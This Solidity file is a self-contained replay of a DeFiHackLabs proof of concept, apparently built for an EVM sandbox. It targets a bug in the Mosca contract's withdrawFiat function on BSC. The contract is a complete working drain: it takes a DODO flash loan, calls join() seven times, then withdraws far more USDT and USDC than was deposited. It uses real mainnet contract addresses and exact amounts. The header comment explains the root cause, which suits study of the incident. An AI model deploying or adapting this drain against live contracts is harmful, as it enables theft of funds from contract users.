// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-01-Mosca2).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the DODO/DPP flash-loan callback `DPPFlashLoanCall`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/Mosca2_exp.sol (Mosca2.testExploit / DPPFlashLoanCall).
//
// Root cause: Mosca.withdrawFiat(amount, isFiat=false, fiatToWithdraw) lets a
// member cash out a self-declared `amount` of a chosen stablecoin (fiat 0=USDC,
// 1=USDT) with no solvency/entitlement check tying the withdrawal to what was
// actually deposited. After 7 cheap join()s (each depositing 991 USDT + 9 USDT
// fee) the attacker calls withdrawFiat for far more than deposited, pulling
// 18,395 USDT (fiat 1) and 26,254.2 USDC (fiat 0) straight out of the contract's
// reserves. The DODO flash loan of 7,000 USDT is only working capital; it is
// repaid at the end, and the net profit is the over-withdrawn USDC.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IMosca {
    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external;
    function withdrawFiat(uint256 amount, bool isFiat, uint8 fiatToWithdraw) external;
}

contract Mosca2Drain {
    address internal constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant Mosca = 0xd8791F0C10B831B605C5D48959EB763B266940B9;
    // The test names this "BUSD" but the address is the BSC-USD (USDT) token.
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    // Recorded attack entrypoint: flash-borrow 7,000 USDT from the DODO DPP pool.
    // The pool re-enters via DPPFlashLoanCall (below) with the borrowed funds.
    function run() external {
        uint256 baseAmount = 0;
        uint256 quoteAmonut = 7_000_000_000_000_000_000_000;
        address assetTo = address(this);
        bytes memory data = abi.encode("0xdead");
        IDODO(DPP).flashLoan(baseAmount, quoteAmonut, assetTo, data);
    }

    // DODO DPP flash-loan callback — the whole attack body.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IERC20(BUSD).approve(Mosca, type(uint256).max);
        IERC20(USDC).approve(Mosca, type(uint256).max);
        for (uint256 i = 0; i < 7; i++) {
            uint256 amount = 1_000_000_000_000_000_000_000;
            uint256 _refCode = 0;
            uint8 fiat = 1;
            bool enterpriseJoin = false;
            IMosca(Mosca).join(amount, _refCode, fiat, enterpriseJoin);
        }

        // The bug: withdrawFiat pays out a self-declared amount of the chosen
        // stablecoin from the contract's reserves, far exceeding what was joined.
        IMosca(Mosca).withdrawFiat(18_671_180_855_284_200_248_407, false, 1); // USDT
        IMosca(Mosca).withdrawFiat(26_648_013_000_000_000_000_000, false, 0); // USDC (net profit)

        // Repay the DODO flash loan (7,000 USDT).
        IERC20(BUSD).transfer(DPP, quoteAmount);
    }
}
